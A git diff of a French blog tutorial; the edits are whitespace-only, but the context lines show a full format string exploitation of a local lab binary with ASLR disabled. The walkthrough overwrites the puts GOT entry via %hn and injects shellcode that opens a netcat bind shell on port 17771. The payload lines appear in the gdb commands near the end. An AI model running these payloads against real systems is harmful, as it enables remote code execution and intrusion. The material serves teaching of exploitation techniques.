@@ -54,8 +54,7 @@ L'exécution est simple:
 ![fmt1]({{ site.url }}/public/images/fmt/fmt1.png)  
 Fuzzons juste pour vérifier que le fgets fait bien son boulot et que nous évitons un débordement classique:  
 
-![fmt2]({{ site.url }}/public/images/fmt/fmt2.png)
-
+![fmt2]({{ site.url }}/public/images/fmt/fmt2.png)  
 Maintenant faisons un autre test:
 ```
 #python -c 'print "%x"*100' | ./simple
@@ -109,18 +108,15 @@ cf [Wikipédia](https://fr.wikipedia.org/wiki/Address_space_layout_randomization
   
 Positionnons un breakpoint juste avant notre appel printf:  
 
-![fmt3]({{ site.url }}/public/images/fmt/fmt3.png)
-  
+![fmt3]({{ site.url }}/public/images/fmt/fmt3.png)  
 Maintenant injectons à nouveau le buffer de 100 caractères et examinons la mémoire juste après l'exécution de notre printf. Pour rappel une cheatsheet sympa en matière de BOs et de fonctionnement de la pile se trouve ici: [https://www.0x0ff.info/wp-content/uploads/2014/02/cheat-sheet.png](https://www.0x0ff.info/wp-content/uploads/2014/02/cheat-sheet.png).  
 
-![fmt4]({{ site.url }}/public/images/fmt/fmt4.png)
-  
+![fmt4]({{ site.url }}/public/images/fmt/fmt4.png)  
 Il est logique de voir apparaitre notre buffer dans des adresses plus hautes sur la stack, les segments de cette dernière étant alloués sur des adresses décroissantes (les plus hautes vers les plus basses) et **printf** étant appelée après l'initialisation de notre buffer.   
   
 Nous pouvons en déduire l'adresse de début de notre buffer. Cependant pour avoir des adresses continues, nous prendrons un byte plus loin: **0xbffff24c**.  
   
-![fmt5]({{ site.url }}/public/images/fmt/fmt5.png)
-  
+![fmt5]({{ site.url }}/public/images/fmt/fmt5.png)  
 Maintenant revenons sur le formateur **%n**:  
 *%n Print nothing, but writes the number of characters successfully written so far into an integer pointer parameter.*
   
@@ -132,31 +128,25 @@ Nous prendrons la fonction puts. Pourquoi ? car cette dernière est appelée jus
 **[objdump](https://linux.die.net/man/1/objdump)** est une command qui nous fournit diverses informations sur les fichiers objet.  
 *-R : Print the dynamic relocation entries of the file.*
   
-![fmt6]({{ site.url }}/public/images/fmt/fmt6.png)
-  
+![fmt6]({{ site.url }}/public/images/fmt/fmt6.png)   
 L'adresse peut également être trouvée de cette façon:  
 
-![fmt7]({{ site.url }}/public/images/fmt/fmt7.png)
-  
+![fmt7]({{ site.url }}/public/images/fmt/fmt7.png)  
 From [Wikipedia](https://en.wikipedia.org/wiki/Relocation_%28computing%29): *The relocation table is a list of pointers created by the compiler or assembler and stored in the object or executable file. Each entry in the table, or "fixup", is a pointer to an absolute address in the object code that must be changed when the loader relocates the program so that it will refer to the correct location.*
   
 ```jmp *0x804a014``` nous montre que l'on va faire un jump à l'adresse contenue à l'adresse *0x804a014*.  
 
-![fmt8]({{ site.url }}/public/images/fmt/fmt8.png)
-  
+![fmt8]({{ site.url }}/public/images/fmt/fmt8.png)  
 Let's check in gdb:  
 
-![fmt9]({{ site.url }}/public/images/fmt/fmt9.png)
-  
+![fmt9]({{ site.url }}/public/images/fmt/fmt9.png)  
 Il semblerait que nous puissions écrire sur ce segment mémoire. Comment allons-nous procéder?  
 D'abord injectons l'adresse mémoire à laquelle nous souhaitons écrire:  
 
 ![fmt10]({{ site.url }}/public/images/fmt/fmt10.png)  
-
 On définit maintenant un point d'arrêt cette fois juste avant l'appel à la fonction printf:  
 
-![fmt11]({{ site.url }}/public/images/fmt/fmt11.png) 
-  
+![fmt11]({{ site.url }}/public/images/fmt/fmt11.png)  
 Bingo. On voit bien que l'adresse a été écrasée et que nous avons une **segmentation fault**.  
   
 Maintenant la partie sensible, l'écriture de cette adresse. Pour écrire cette adresse nous utiliserons le formateur **%7$hn** dans notre cas. L'instruction de formatage **%hn** n'écrit que sur **16 octets**.  
@@ -189,8 +179,7 @@ Maintenant déterminons l'adresse précise de notre shellcode:
 (gdb) r < <(python -c 'print "A" + "\x14\xa0\x04\x08" + "\x16\xa0\x04\x08" + "%65535x" + "%8$hn" + "%65535x" + "%7$hn" + "A"*50')
 ```  
   
-![fmt12]({{ site.url }}/public/images/fmt/fmt12.png)
-  
+![fmt12]({{ site.url }}/public/images/fmt/fmt12.png)  
 **0xbffff26c** semble être un bon candidat. On ajoutera quelques NOPs également comme marge de manoeuvre, l'objectif étant de tomber dans nos NOPs et de slider jusqu'à notre shellcode.  
   
 Ok maintenant les calculs:  
@@ -218,8 +207,7 @@ Ensuite on teste:
 (gdb) r < <(python -c 'print "A" + "\x14\xa0\x04\x08" + "\x16\xa0\x04\x08" + "%49142x" + "%8$hn" + "%12909x" + "%7$hn" + "\x90"*4 + "A"*100')
 ```
   
-![fmt13]({{ site.url }}/public/images/fmt/fmt13.png)
-  
+![fmt13]({{ site.url }}/public/images/fmt/fmt13.png)  
 un rapide calcul nous montre qu'il nous reste **63 bytes** pour notre shellcode. 
   
 Allons faire notre marché sur [shell-storm](http://shell-storm.org/shellcode/) (cocorico!).  
@@ -231,16 +219,13 @@ Nous adaptons donc notre payload et le testons sous gdb:
 (gdb) r < <(python -c 'print "A" + "\x14\xa0\x04\x08" + "\x16\xa0\x04\x08" + "%49142x" + "%8$hn" + "%12909x" + "%7$hn" + "\x90"*4 + "\x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80"')
 ```
   
-![fmt14]({{ site.url }}/public/images/fmt/fmt14.png) 
-  
+![fmt14]({{ site.url }}/public/images/fmt/fmt14.png)  
 Here we go, essayons de nous connecter:  
 
-![fmt15]({{ site.url }}/public/images/fmt/fmt15.png)
-  
+![fmt15]({{ site.url }}/public/images/fmt/fmt15.png)  
 Du coté de notre shellcode:  
 
-![fmt16]({{ site.url }}/public/images/fmt/fmt16.png)
-  
+![fmt16]({{ site.url }}/public/images/fmt/fmt16.png)  
 Nous pouvons donc en conclure qu'à partir d'un simple appel *printf*, il a été possible d'exécuter un bind shell. Bien évidemment ceci est un cas d'école et a été possible grâce à la désactivation de l'ASLR, rendant ainsi nos adresses prédictibles.
 
 Pour conclure, si vous rencontrez un souci entre l'exécution dans l'environnement gdb et votre shell, voici une réponse: [https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it). Assurez-vous que les environnements soient strictement identiques.
